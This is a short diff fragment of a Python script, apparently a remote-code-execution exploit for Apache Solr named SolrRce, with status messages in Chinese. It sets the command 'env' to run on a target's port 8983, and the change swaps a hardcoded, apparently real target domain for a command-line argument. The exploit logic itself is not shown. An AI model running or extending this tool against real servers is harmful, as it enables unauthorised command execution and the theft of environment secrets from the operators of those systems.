@@ -85,9 +85,7 @@ class SolrRce:
                 cprint('[*] 命令执行结果: \n %s' % cmd_result.text, 'yellow')
 
 
-# host = sys.argv[1]
-
-host = 'www.founderfx1.cn'
+host = sys.argv[1]
 solr_url = "http://%s:8983" % host
 cmd = 'env'
 solr = SolrRce(solr_url, cmd)
